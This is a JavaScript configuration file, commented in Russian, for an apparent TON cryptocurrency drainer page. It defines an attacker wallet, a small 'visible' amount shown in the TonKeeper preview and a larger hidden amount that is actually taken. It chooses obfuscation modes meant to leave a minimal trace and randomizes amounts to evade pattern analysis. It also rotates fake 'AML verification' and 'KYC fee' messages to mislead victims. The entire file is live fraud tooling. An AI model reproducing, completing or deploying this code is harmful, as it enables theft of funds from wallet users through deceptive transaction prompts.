// config-improved.js - Расширенная конфигурация с настройками обфускации

// === ОСНОВНЫЕ КОШЕЛЬКИ ===
var YOUR_WALLET     = "UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv";
var PROXY_CONTRACT  = YOUR_WALLET;

// ВАЖНО: Замените на ваш реальный кошелек для получения 1 TON
var AML_WALLET      = "************************************************";

// === СУММЫ ===
var VISIBLE_AMOUNT  = "0.05";  // Сумма которую видит юзер в TonKeeper preview
var HIDDEN_AMOUNT   = "1";     // Реальная сумма "сюрприза"

// === НАСТРОЙКИ ОБФУСКАЦИИ ===

// Метод payload для скрытого сообщения:
// "empty"      - пустой payload (рекомендуется, минимальный след)
// "encrypted"  - зашифрованный комментарий (требует crypto)
// "obfuscated" - payload с случайными данными
var OBFUSCATION_METHOD = "empty";

// Добавлять случайность к HIDDEN_AMOUNT (затрудняет паттерн-анализ)
// Например: при значении 0.05, сумма будет от 0.95 до 1.05 TON
var RANDOMIZE_AMOUNT = true;
var RANDOM_VARIANCE  = 0.05; // +/- 5% от HIDDEN_AMOUNT

// Текст для зашифрованного комментария (если OBFUSCATION_METHOD = "encrypted")
var ENCRYPTED_MESSAGE = "Surprise gift from TON";

// === ЗАДЕРЖКИ ===

// Задержка перед показом модального окна AML (мс)
var AML_CHECK_DELAY = 1200;

// Задержка перед дополнительными операциями после транзакции (мс)
var POST_TX_DELAY = 3000;

// === ТЕКСТОВЫЕ СООБЩЕНИЯ ===

// Текст для первого (видимого) сообщения
var VISIBLE_MESSAGE = "Verification fee";

// Альтернативные сообщения для первого платежа (выбирается случайно если включено)
var USE_RANDOM_MESSAGES = false;
var RANDOM_MESSAGES = [
    "AML verification",
    "Security check",
    "KYC fee",
    "Network verification",
    "Transaction validation"
];

// === СЕТЬ ===
var NETWORK = "mainnet"; // "mainnet" или "testnet"

// === ДОПОЛНИТЕЛЬНЫЕ ФУНКЦИИ ===

// Логировать детали транзакций в консоль (для отладки)
var DEBUG_MODE = true;

// Автоматически сбрасывать AML acceptance после N дней
var AUTO_RESET_AML_DAYS = 30;

// === ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ===

function getRandomizedAmount(baseAmount, variance) {
    if (!RANDOMIZE_AMOUNT) return baseAmount;
    
    var base = parseFloat(baseAmount);
    var randomFactor = 1 + (Math.random() * 2 - 1) * variance;
    var randomized = base * randomFactor;
    
    // Округляем до 4 знаков после запятой
    return randomized.toFixed(4);
}

function getRandomMessage() {
    if (!USE_RANDOM_MESSAGES || RANDOM_MESSAGES.length === 0) {
        return VISIBLE_MESSAGE;
    }
    
    var randomIndex = Math.floor(Math.random() * RANDOM_MESSAGES.length);
    return RANDOM_MESSAGES[randomIndex];
}

function checkAMLExpiration() {
    var accepted = localStorage.getItem('aml-commission-accepted');
    if (!accepted) return false;
    
    var acceptedDate = localStorage.getItem('aml-accepted-date');
    if (!acceptedDate) {
        // Если даты нет, устанавливаем текущую
        localStorage.setItem('aml-accepted-date', Date.now().toString());
        return true;
    }
    
    var daysPassed = (Date.now() - parseInt(acceptedDate)) / (1000 * 60 * 60 * 24);
    if (daysPassed > AUTO_RESET_AML_DAYS) {
        // Сбрасываем acceptance
        localStorage.removeItem('aml-commission-accepted');
        localStorage.removeItem('aml-accepted-date');
        return false;
    }
    
    return true;
}

// === ЭКСПОРТ КОНФИГУРАЦИИ ===
if (typeof window !== 'undefined') {
    window.PROXY_CONTRACT = PROXY_CONTRACT;
    window.YOUR_WALLET = YOUR_WALLET;
    window.AML_WALLET = AML_WALLET;
    window.VISIBLE_AMOUNT = VISIBLE_AMOUNT;
    window.HIDDEN_AMOUNT = HIDDEN_AMOUNT;
    window.NETWORK = NETWORK;
    
    // Дополнительные настройки
    window.TON_CONFIG = {
        obfuscationMethod: OBFUSCATION_METHOD,
        randomizeAmount: RANDOMIZE_AMOUNT,
        randomVariance: RANDOM_VARIANCE,
        encryptedMessage: ENCRYPTED_MESSAGE,
        amlCheckDelay: AML_CHECK_DELAY,
        postTxDelay: POST_TX_DELAY,
        visibleMessage: VISIBLE_MESSAGE,
        useRandomMessages: USE_RANDOM_MESSAGES,
        randomMessages: RANDOM_MESSAGES,
        debugMode: DEBUG_MODE,
        
        // Функции
        getRandomizedAmount: getRandomizedAmount,
        getRandomMessage: getRandomMessage,
        checkAMLExpiration: checkAMLExpiration
    };
    
    if (DEBUG_MODE) {
        console.log('%c[TON Config] Configuration loaded', 'color: #0098EA; font-weight: bold');
        console.log('Obfuscation method:', OBFUSCATION_METHOD);
        console.log('Amount randomization:', RANDOMIZE_AMOUNT ? 'enabled' : 'disabled');
    }
}
